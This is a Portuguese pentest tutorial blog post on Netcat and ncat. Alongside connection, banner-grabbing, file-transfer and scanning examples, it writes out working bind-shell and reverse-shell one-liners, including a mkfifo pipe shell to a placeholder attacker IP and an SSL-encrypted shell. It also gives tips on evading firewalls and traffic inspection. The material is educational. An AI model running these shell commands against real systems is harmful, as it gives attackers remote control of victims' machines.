<!DOCTYPE html>
<html lang="br">
<head>
  
    <title>Pentest 0x00 - Netcat: O canivete su√≠√ßo dos hackers :: Midnight Hackings</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content=" Escrito por: Mateus Gualberto (Midnight Reverser) - orgulho de escrever sem IA envolvida no processo!
Licen√ßa: livre, como todo conhecimento deve ser.
Introdu√ß√£o Nessa s√©rie de postagens, iremos descrever ferramentas essenciais que ser√£o √∫teis para diversos cen√°rios de pentest.
Essas ferramentas servir√£o principalmente para execu√ß√£o de comandos, estabelecimento de shells, envio de arquivos e an√°lise de pacotes de redes.
Hoje trataremos no Netcat, ou nc. O IP utilizado pode sofrer altera√ß√µes de exemplo para exemplo, logo √© importante que o leitor entenda as diferen√ßas entre o IP da v√≠tima e do atacante ao longo do texto.
" />
<meta name="keywords" content="midnight,blog,reverse-engineer,reversing" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://blog.midnighthackings.com/posts/pentest-0x00/" />





  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">


<link rel="stylesheet" href="https://blog.midnighthackings.com/terminal.css">




<link rel="shortcut icon" href="https://blog.midnighthackings.com/favicon.png">
<link rel="apple-touch-icon" href="https://blog.midnighthackings.com/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="br" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Pentest 0x00 - Netcat: O canivete su√≠√ßo dos hackers">
<meta property="og:description" content=" Escrito por: Mateus Gualberto (Midnight Reverser) - orgulho de escrever sem IA envolvida no processo!
Licen√ßa: livre, como todo conhecimento deve ser.
Introdu√ß√£o Nessa s√©rie de postagens, iremos descrever ferramentas essenciais que ser√£o √∫teis para diversos cen√°rios de pentest.
Essas ferramentas servir√£o principalmente para execu√ß√£o de comandos, estabelecimento de shells, envio de arquivos e an√°lise de pacotes de redes.
Hoje trataremos no Netcat, ou nc. O IP utilizado pode sofrer altera√ß√µes de exemplo para exemplo, logo √© importante que o leitor entenda as diferen√ßas entre o IP da v√≠tima e do atacante ao longo do texto.
" />
<meta property="og:url" content="https://blog.midnighthackings.com/posts/pentest-0x00/" />
<meta property="og:site_name" content="Midnight Hackings" />

  <meta property="og:image" content="https://blog.midnighthackings.com/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2022-07-05 12:00:00 -0300 -03" />












</head>
<body>


<div class="container center">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Midnight Hackings
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;‚ñæ</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/posts">Postagens</a></li>
        
      
        
          <li><a href="/tags">Tags</a></li>
        
      
        
          <li><a href="https://github.com/midnight-rev">Github</a></li>
        
      
        
          <li><a href="/index.xml">RSS</a></li>
        
      
        
          <li><a href="/contact">Sobre</a></li>
        
      
      
        <hr />
        
          <li>
            <a href="https://blog.midnighthackings.com/">üáßüá∑ Brasileiro</a>
          </li>
        
      
    </ul>
  </li>
</ul>

    
    
      <ul class="menu menu--desktop menu--language-selector">
  <li class="menu__trigger">üáßüá∑ Brasileiro&nbsp;‚ñæ</li>
  <li>
    <ul class="menu__dropdown">
      
        <li><a href="https://blog.midnighthackings.com/">üáßüá∑ Brasileiro</a></li>
      
    </ul>
  </li>
</ul>

    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/posts" >Postagens</a></li>
        
      
        
          <li><a href="/tags" >Tags</a></li>
        
      
        
          <li><a href="https://github.com/midnight-rev" >Github</a></li>
        
      
        
          <li><a href="/index.xml" >RSS</a></li>
        
      
        
          <li><a href="/contact" >Sobre</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://blog.midnighthackings.com/posts/pentest-0x00/">Pentest 0x00 - Netcat: O canivete su√≠√ßo dos hackers</a>
  </h1>
  <div class="post-meta"><time class="post-date">05/07/2022&nbsp;[Atualizado em 05/07/2022]</time><span class="post-reading-time">10 minuto(s) de leitura (2017 palavras)</span></div>

  
    <span class="post-tags">
      
      #<a href="https://blog.midnighthackings.com/tags/pentest/">pentest</a>&nbsp;
      
      #<a href="https://blog.midnighthackings.com/tags/tools/">tools</a>&nbsp;
      
    </span>
  
  


  
    <div class="table-of-contents">
      <h2>
        Sum√°rio
      </h2>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#nc">nc</a>
      <ul>
        <li><a href="#exemplo-1---conectando-se-a-tcp">Exemplo 1 - Conectando-se a TCP</a></li>
        <li><a href="#exemplo-2---conectando-se-a-udp">Exemplo 2 - Conectando-se a UDP</a></li>
        <li><a href="#exemplo-3---conectando-se-ao-http--enumera√ß√£o-de-vers√£o">Exemplo 3 - Conectando-se ao HTTP &amp; enumera√ß√£o de vers√£o</a></li>
        <li><a href="#exemplo-4---fazendo-um-mini-chat">Exemplo 4 - Fazendo um mini-chat</a></li>
        <li><a href="#exemplo-5---enviando-e-recebendo-arquivos">Exemplo 5 - Enviando e recebendo arquivos</a></li>
        <li><a href="#exemplo-6---bind-shell">Exemplo 6 - Bind shell</a></li>
        <li><a href="#exemplo-7---reverse-shell">Exemplo 7 - Reverse shell</a></li>
        <li><a href="#exemplo-8---reverse-shell-nova-forma">Exemplo 8 - Reverse shell (nova forma)</a></li>
        <li><a href="#exemplo-9---modo-scan">Exemplo 9 - Modo scan</a></li>
      </ul>
    </li>
    <li><a href="#ncat">ncat</a></li>
  </ul>
</nav>
    </div>
  

  <div class="post-content"><div>
        <blockquote>
<p>Escrito por: Mateus Gualberto (Midnight Reverser) - <strong>orgulho de escrever sem IA envolvida no processo!</strong><br>
Licen√ßa: livre, como todo conhecimento deve ser.</p>
</blockquote>
<h1 id="introdu√ß√£o">Introdu√ß√£o<a href="#introdu√ß√£o" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>Nessa s√©rie de postagens, iremos descrever ferramentas essenciais que ser√£o √∫teis para diversos cen√°rios de pentest.</p>
<p>Essas ferramentas servir√£o principalmente para execu√ß√£o de comandos, estabelecimento de <em>shells</em>, envio de arquivos e an√°lise de pacotes de redes.</p>
<p>Hoje trataremos no Netcat, ou <code>nc</code>. O IP utilizado pode sofrer altera√ß√µes de exemplo para exemplo, logo √© importante que o leitor entenda as diferen√ßas entre o IP da v√≠tima e do atacante ao longo do texto.</p>
<h2 id="nc">nc<a href="#nc" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Netcat, ou nc, √© um software que permite intera√ß√£o com servi√ßos dispon√≠veis em uma rede, independente de usarem UDP ou TCP na camada de transporte. Em cen√°rios de reconhecimento e enumera√ß√£o, ele pode ser √∫til para realizar varredura por servi√ßos, hosts e buscar por vers√µes de aplica√ß√µes que est√£o expostas na internet ou intranet.</p>
<p>√â um software que j√° vem por padr√£o em v√°rias distribui√ß√µes linux, tornando-o uma ferramenta de interesse por invasores.</p>
<h3 id="exemplo-1---conectando-se-a-tcp">Exemplo 1 - Conectando-se a TCP<a href="#exemplo-1---conectando-se-a-tcp" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>O uso mais b√°sico do netcat √© descrito abaixo. Ele ir√° tentar fechar uma conex√£o TCP no host/porta especificado.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -v &lt;ip ou hostname&gt; &lt;porta&gt;
</span></span></code></pre></div><p>O argumento <code>-v</code> ir√° trazer informa√ß√µes √∫teis sobre a conex√£o. Caso ela tenha sucesso, como em <code>nc -v google.com 80</code>, teremos o seguinte resultado:</p>

<img src="img/dc9d654507bf494c879d332e62bf0d26.png"  class="center"  style="border-radius: 1px;"    />


<p>Por√©m, caso a porta especificada n√£o esteja aberta no alvo, teremos a seguinte sa√≠da:</p>

<img src="img/09b2b96009c04593af18985a49f57673.png"  class="center"  style="border-radius: 1px;"    />


<blockquote>
<p>Isso j√° nos d√° a possibilidade de produzir um scanner de portas em shell script para identificar portas abertas em um host especificado.</p>
</blockquote>
<p>Quando conectado com sucesso ao <em>socket</em> (tupla ip:porta), √© poss√≠vel enviar e receber bytes pelos descritores de entrada padr√£o e sa√≠da/sa√≠da de erro padr√£o (stdin/stdout), respectivamente.</p>
<p>Nos pr√≥ximos exemplos exploraremos a conex√£o UDP e os potenciais usos de envio e recebimento de bytes.</p>
<h3 id="exemplo-2---conectando-se-a-udp">Exemplo 2 - Conectando-se a UDP<a href="#exemplo-2---conectando-se-a-udp" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>No exemplo passado, realizamos a conex√£o utilizando TCP como protocolo de camada de transporte. Existem protocolos da camada de aplica√ß√£o, como o DNS, que n√£o utilizam TCP e sim UDP.</p>
<p>Para se conectar a essas aplica√ß√µes usando o netcat, passaremos a flag <code>-u</code>, de UDP:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -v -u &lt;ip ou hostname&gt; &lt;porta&gt;
</span></span></code></pre></div><p>Um exemplo pr√°tico √© a comunica√ß√£o com o DNS do Google:</p>

 <img src="img/86bb73c6740d4c8ab3f1a948fa0719c6.png"  class="center"  style="border-radius: 1px;"    />
 

<h3 id="exemplo-3---conectando-se-ao-http--enumera√ß√£o-de-vers√£o">Exemplo 3 - Conectando-se ao HTTP &amp; enumera√ß√£o de vers√£o<a href="#exemplo-3---conectando-se-ao-http--enumera√ß√£o-de-vers√£o" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Para comunica√ß√£o HTTP, podemos realizar requisi√ß√µes manualmente atrav√©s do netcat:</p>

<img src="img/90fc66082bdf41a1aae116475dc3c702.png"  class="center"  style="border-radius: 1px;"    />


<p>Nesse caso, segundo as especifica√ß√µes do HTTP, na primeira linha de requisi√ß√£o temos que passar o m√©todo, o recurso a ser acesso e qual vers√£o do HTTP deve ser utilizada nessa comunica√ß√£o. Isso est√° descrito na <a href="https://datatracker.ietf.org/doc/html/rfc2616">RFC do HTTP</a>.</p>
<blockquote>
<p>Note que, caso voc√™ conhe√ßa o formato das requisi√ß√µes a serem realizadas para determinado protocolo, √© poss√≠vel utilizar o netcat para acess√°-lo e utiliz√°-lo.</p>
</blockquote>
<p><strong>NOTA:</strong> Para HTTP, precisamos dar dois &ldquo;enter&rdquo; (tecnicamente, dois caracteres <em>carriage return</em> e <em>new line</em>) para que o servidor retorne as informa√ß√µes para o cliente (netcat). Isso √© necess√°rio pois podemos enviar headers ap√≥s a solicita√ß√£o de determinado recurso.</p>
<p>Em determinados servidores de hospedagem HTTP, um mesmo IP pode estar sendo utilizado para diversos dom√≠nios/aplica√ß√µes. Nesses casos, torna-se necess√°rio enviar o header <code>Host: dominio.com</code> especificando qual aplica√ß√£o queremos acessar.</p>

<img src="img/5f7c4738e06c459b9b3adf6a203881c4.png"  class="center"  style="border-radius: 1px;"    />


<p>Note que nas imagens anteriores, a vers√£o do servidor foi retornada na resposta. Isso vale para outros servidores e protocolos, e se chama <em>enumera√ß√£o de vers√£o</em>, algo vital em um pentest, pois a partir disso podemos buscar por vulnerabilidades ou poss√≠veis fragilidades naquela vers√£o espec√≠fica do servidor.</p>
<h3 id="exemplo-4---fazendo-um-mini-chat">Exemplo 4 - Fazendo um mini-chat<a href="#exemplo-4---fazendo-um-mini-chat" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Uma das fun√ß√µes mais √∫teis do netcat √© a possibilidade de utiliz√°-lo tamb√©m como servidor. Para isso, iremos especificar tr√™s flags nos argumentos de linha de comando:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">-n <span class="c1"># n√£o resolve hostnames, ou seja, utiliza apenas os IPs encontrados nas interfaces de rede da m√°quina</span>
</span></span><span class="line"><span class="cl">-l <span class="c1"># de &#34;listening&#34;, ou seja, informa ao netcat que desejamos ouvir conex√µes (modo servidor)</span>
</span></span><span class="line"><span class="cl">-v <span class="c1"># modo verbose</span>
</span></span><span class="line"><span class="cl">-p <span class="c1"># define a porta que o netcat deve realizar um &#34;bind&#34;</span>
</span></span></code></pre></div><p>O comando final ficar√° assim:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -nlvp <span class="m">1337</span>
</span></span></code></pre></div>
<img src="img/cb3f4de66693490bafdbb20009da451d.png"  class="center"  style="border-radius: 1px;"    />


<p>Acima especificamos a porta TCP 1337 como &ldquo;bind&rdquo; do nosso servidor. Toda comunica√ß√£o para o servidor do netcat dever√° acontecer por ela.</p>
<p>Vamos, agora, conectar um outro terminal (ou outro host) e executar o netcat como cliente:</p>

<img src="img/edfb06174e374804b1e4c8958c9bb44b.png"  class="center"  style="border-radius: 1px;"    />


<p>Logo em seguida, no servidor nos √© informado que h√° uma conex√£o estabelecida com nossa sess√£o:</p>

<img src="img/c56126136c2b4a6fbaf687257bfc07ac.png"  class="center"  style="border-radius: 1px;"    />


<p>A partir de agora, √© poss√≠vel enviar e receber dados de qualquer um dos lados:</p>
<p>Envio de mensagem pelo servidor:

<img src="img/0d164c622d7644c2bc9d3ea5aaa0ecc0.png"  class="center"  style="border-radius: 1px;"    />

</p>
<p>Recebimento da mensagem pelo cliente:

<img src="img/47b8213bbb1e415097416b1bedef57f2.png"  class="center"  style="border-radius: 1px;"    />

</p>
<h3 id="exemplo-5---enviando-e-recebendo-arquivos">Exemplo 5 - Enviando e recebendo arquivos<a href="#exemplo-5---enviando-e-recebendo-arquivos" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Como estamos utilizando uma shell para invocar o netcat, podemos redirecionar a entrada e sa√≠da padr√£o para que sejam arquivos. Dessa forma, podemos utilizar a ferramenta para envio de arquivos para um host remoto.</p>
<p>Por exemplo, para repassarmos um arquivo malicious.exe para uma v√≠tima, far√≠amos:</p>
<p>V√≠tima:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -lvp <span class="m">1337</span> &gt; malicious.exe
</span></span></code></pre></div><p>Atacante:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc ip_da_vitima <span class="m">1337</span> &lt; malicious.exe
</span></span></code></pre></div><p>Note que a v√≠tima est√° utilizando o netcat como servidor e o atacante como cliente, mas tamb√©m √© poss√≠vel realizar o processo contr√°rio, como nos comandos a seguir:</p>
<p>Atacante:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -lvp <span class="m">1337</span> &lt; malicious.exe
</span></span></code></pre></div><p>V√≠tima:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc ip_do_atacante <span class="m">1337</span> &gt; malicious.exe
</span></span></code></pre></div><p>Em ambos os casos, a v√≠tima ir√° redirecionar a sa√≠da padr√£o (&gt;) para um arquivo chamado malicious.exe. Ou seja, todos os bytes que chegarem pelo netcat ir√£o compor o arquivo final.</p>
<p>Quando o atacante redireciona a sua entrada padr√£o (&lt;) para o arquivo malicious.exe, o netcat ir√° enviar todos os bytes desse arquivo para a v√≠tima.</p>
<p>Esse procedimento pode levar um tempo e o netcat n√£o mostra informa√ß√µes da completude do envio, logo devemos esperar um momento at√© que todos os bytes sejam enviados. Como explicaremos em outras postagens, uma shell reversa e <em>exploits</em>, de uma forma geral, s√£o arquivos pequenos, que n√£o v√£o demorar para serem transferidos.</p>
<p>Nas imagens a seguir, foi realizado o primeiro procedimento descrito nessa se√ß√£o. Ap√≥s o envio, podemos confirmar que o arquivo recebido pela v√≠tima realmente √© um bin√°rio PE (EXE) com o comando <code>file</code>:</p>
<h3 id="exemplo-6---bind-shell">Exemplo 6 - Bind shell<a href="#exemplo-6---bind-shell" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Uma <em>bind shell</em> √© um dos tipos mais b√°sicos de malware para controle de um alvo. O procedimento √© o seguinte:</p>
<blockquote>
<ol>
<li>O atacante envia um arquivo malicioso para que a v√≠tima execute. Esse malware ir√° habilitar um pequeno servidor (&ldquo;abrir uma porta&rdquo;) no computador do alvo.</li>
<li>O atacante ir√°, ent√£o, se conectar a esse pequeno servidor, utilizando o IP do alvo e a porta escolhida previamente.</li>
<li>Ao estabelcer a comunica√ß√£o, o invasor poder√° enviar comandos (como comandos do cmd, powershell ou bash) para que o alvo execute e envie a resposta.</li>
</ol>
</blockquote>

<img src="img/f59ba832934f48c28e5601af6fe05f8d.png"  class="center"  style="border-radius: 1px;"    />


<p>Isso garante o controle remoto de um computador.
Para que n√£o necessitemos (por hora) codificar um malware desse tipo, o netcat j√° consegue nos prover o necess√°rio para realizar esse procedimento, ao passarmos o argumento <code>-e</code> para a v√≠tima.</p>
<p><code>-e, --exec &lt;command&gt;       Executes the given command</code></p>
<blockquote>
<p>Note que nas vers√µes mais recentes do Ubuntu, voc√™ deve baixar o <code>ncat</code>, vers√£o do netcat distribu√≠do pela nmap.org. Para que os comandos abaixo funcionem, executem antes <code>alias nc=ncat</code>.</p>
</blockquote>
<p>Al√©m da op√ß√£o <code>-e</code>, temos que repassar qual ser√° o bin√°rio respons√°vel por realizar o processamento e interpreta√ß√£o dos comandos. Em windows, podemos utilizar <code>-e cmd.exe</code> e em Linux <code>-e /bin/bash</code>.</p>
<p>O comando de uma v√≠tima Linux ficar√° assim:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -nlvp <span class="m">1337</span> -e /bin/bash
</span></span></code></pre></div><p>Ao conectarmos com <code>nc ip_da_vitima 1337</code> e digitarmos algum comando reconhecido pelo <code>/bin/bash</code>, teremos o retorno:</p>

<img src="img/0a9e8afb2eae4d7985f864e920bb1833.png"  class="center"  style="border-radius: 1px;"    />


<p>Isso nos permite executar c√≥digo arbitr√°rio, enviar arquivos, entre outras possibilidades. Supondo que a v√≠tima seja um servidor que esteja exposto na internet, √© poss√≠vel ter acesso √† rede interna a partir do conceito aprendido nessa se√ß√£o.</p>
<h3 id="exemplo-7---reverse-shell">Exemplo 7 - Reverse shell<a href="#exemplo-7---reverse-shell" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>O conceito de shell reversa surgiu devido a bloqueios padr√£o de ferramentas de seguran√ßa a n√≠vel de rede, como Firewalls, que geralmente bloqueiam requisi√ß√µes <em>inbound</em> para computadores da rede interna.</p>
<p>Isso √© poss√≠vel pois geralmente quem faz as requisi√ß√µes s√£o os computadores da rede interna para um servidor externo (como o acesso a um webserver) e n√£o o contr√°rio.</p>
<p>Al√©m disso, uma <em>bind shell</em> pode gerar um alerta suspeito no alvo devido ao processo de binding com uma porta. Um funcion√°rio comum de escrit√≥rio n√£o necessita abrir um servidor em uma porta n√£o-padr√£o no dia-a-dia.</p>
<p>Vamos entender o fluxo e as vantagens de se utilizar uma shell reversa:</p>
<blockquote>
<ol>
<li>O atacante ir√° subir um pequeno servidor na sua m√°quina</li>
<li>Ele enviar√° um pequeno malware para a v√≠tima, que quando clicado ir√° tentar se comunicar com o servidor do atacante</li>
<li>O atacante ir√° enviar comandos para a v√≠tima, que ir√° executar e retornar seu output</li>
</ol>
</blockquote>
<blockquote>
<p>Por vezes, esse tipo de servidor √© chamado de servidor C2, C&amp;C ou command-and-control</p>
</blockquote>

<img src="img/f68a29657fa642c7bd72465f063995e9.png"  class="center"  style="border-radius: 1px;"    />


<p>Note que a diferen√ßa principal de uma shell reversa para uma shell bind √© que o servidor estar√° do lado do atacante, permitindo mascarar o tr√°fego e evitar criar um servidor na v√≠tima. A execu√ß√£o de comandos se d√° da mesma forma que a bind shell.</p>
<p>Os comandos a serem executados para a realiza√ß√£o de uma shell reversa via netcat s√£o os seguintes:</p>
<p>Atacante:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -nlvp <span class="m">80</span>
</span></span></code></pre></div><p>V√≠tima:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc ip_do_atacante <span class="m">80</span> -e /bin/bash
</span></span></code></pre></div><p>Lembrando que podemos mudar o interpretador para o <code>cmd.exe</code> ou qualquer outro que exista no ambiente.</p>
<p>Especificamos a porta 80 por uma raz√£o bem importante: geralmente tr√°fego na porta 80/HTTP √© liberado em diversas empresas, e logo n√£o ter√° restri√ß√µes de comunica√ß√£o. Para um cen√°rio simples de monitoramento de rede, √© apenas uma conex√£o de um computador com um site, por exemplo.</p>
<h3 id="exemplo-8---reverse-shell-nova-forma">Exemplo 8 - Reverse shell (nova forma)<a href="#exemplo-8---reverse-shell-nova-forma" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Vers√µes padr√£o do netcat podem n√£o conter mais a op√ß√£o <code>-e</code>, que torna o trabalho do pentester um pouco mais complicado.</p>
<p>Contudo, mesmo sem essa op√ß√£o √© poss√≠vel utilizar a ferramenta para estabelecer uma shell reversa com o alvo. Para isso, utilizaremos parte da linha de comando do Netcat OpenBsd, dispon√≠vel no github do <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd">Payload All The Things</a>.</p>
<p>Atacante:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -nlvp <span class="m">8080</span>
</span></span></code></pre></div><p>V√≠tima:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mkfifo /tmp/f<span class="p">;</span> cat /tmp/f <span class="p">|</span> /bin/sh -i 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> nc attacker_ip <span class="m">8080</span> &gt;/tmp/f
</span></span></code></pre></div><ul>
<li><code>mkfifo /tmp/f</code>: A v√≠tima ir√° criar um arquivo <em>FIFO</em> (named pipe, uma forma de comunica√ß√£o interprocessos), em <code>/tmp/f</code>, para recebimento dos comandos do atacante e envio dos outputs.</li>
<li><code>cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc attacker_ip 8080 &gt;/tmp/f</code>: Essa segunda parte ir√° esperar e ler os comandos recebidos no named pipe (atrav√©s do <code>cat</code>), pass√°-los para o processamento da shell <code>/bin/sh</code> e redirecionar a sa√≠da de erro para a sa√≠da padr√£o com <code>2&gt;&amp;1</code> (para que os erros tamb√©m sejam enviados ao atacante). Por fim, o trecho  <code>nc attacker_ip 8080 &gt;/tmp/f</code> ir√° fazer o papel de ponte entre o atacante e a v√≠tima, obtendo os comandos e enviando as sa√≠das.</li>
</ul>
<p>Exemplo de resultado da execu√ß√£o:</p>
<p>V√≠tima:

<img src="img/25b06b26c705447c884120c67c80d9ab.png"  class="center"  style="border-radius: 1px;"    />

</p>
<p>Servidor C2:

<img src="img/664eaf0b0d974db5a876c4e68f41ee27.png"  class="center"  style="border-radius: 1px;"    />

</p>
<h3 id="exemplo-9---modo-scan">Exemplo 9 - Modo scan<a href="#exemplo-9---modo-scan" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>A fim de detectar servi√ßos em um host, podemos utilizar o argumento <code>-z</code> passando o ip do host a ser escaneado e uma porta ou range de portas.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">nc -vz ip_host range_ports
</span></span></code></pre></div><p>Onde <code>range_ports</code> pode ser uma √∫nica porta ou um intervalo fechado no formato <code>porta_min-porta_max</code>.</p>
<p>Um exemplo da sa√≠da desse comando:</p>

<img src="img/b6c86b24db5446059fec66034a4a9d1e.png"  class="center"  style="border-radius: 1px;"    />


<p>Nessa sa√≠da, podemos ver que do range de portas 75 a 85 do host, apenas a porta 80 estava aberta.</p>
<h2 id="ncat">ncat<a href="#ncat" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>O ncat √© a vers√£o do netcat com suporte ao SSL/TLS. Essa vantagem permite a enumera√ß√£o de alvos que utilizem esses protocolos, como o HTTPS, e ofusca√ß√£o de comandos enviados para o destino em uma <em>shell</em> caso o alvo n√£o realize inspe√ß√£o TLS.</p>
<blockquote>
<p>Para instal√°-lo em vers√µes atuais do Ubuntu, use <code>sudo apt update -y &amp;&amp; sudo apt install ncat -y</code></p>
</blockquote>
<p>Por exemplo, se quisermos acessar o host <code>google.com</code> na porta 443 usando o <code>nc</code>, ao enviarmos qualquer requisi√ß√£o, a conex√£o √© fechada:</p>

<img src="img/7cffbd653f5b42c7940d7317611f94fb.png"  class="center"  style="border-radius: 1px;"    />


<p>J√° quando usamos o <code>ncat</code>, com o argumento <code>--ssl</code>, podemos digitar nossa requisi√ß√£o sem erros:</p>

<img src="img/556d19ebe22e40509048f915fb55b206.png"  class="center"  style="border-radius: 1px;"    />


<p>Importante notar que a maioria (sen√£o todos) os comandos do netcat s√£o v√°lidos no <code>ncat</code>.</p>
<p>Logo, podemos criar um servidor que utiliza SSL e realizar um procedimento de shell reversa com uma v√≠tima. Em cen√°rios em que n√£o h√° inspe√ß√£o de tr√°fego SSL/TLS, esse √© um m√©todo que pode mascarar os comandos que est√£o sendo enviados, pois eles estar√£o sendo enviados criptografados.</p>
<p>Atacante:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ncat --ssl -nlvp <span class="m">1337</span>
</span></span></code></pre></div><p>V√≠tima:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ncat --ssl 127.0.0.1 <span class="m">1337</span> -e /bin/bash
</span></span></code></pre></div><p>Abaixo, o resultado do teste:</p>

<img src="img/1d441cb976c544b8b0d6bce013a2d919.png"  class="center"  style="border-radius: 1px;"    />



<img src="img/41767c0223034340b16c905a1063ed76.png"  class="center"  style="border-radius: 1px;"    />



      </div></div>

  
    
<div class="pagination">
  <div class="pagination__title">
    <span class="pagination__title-h">Ler outras postagens</span>
    <hr />
  </div>
  <div class="pagination__buttons">
    
      <a href="https://blog.midnighthackings.com/posts/maldev-0x00/" class="button inline prev">
        &lt; [<span class="button__text">Malware-Dev 0x00 - APC Injection &amp; EarlyBird, ou: Bypassando Windows Defender por divers√£o e lucro</span>]
      </a>
    
    
    
  </div>
</div>


  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">
        <span>Midnight Hackings apoia o fim da escala 6x1!</span>
    
      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
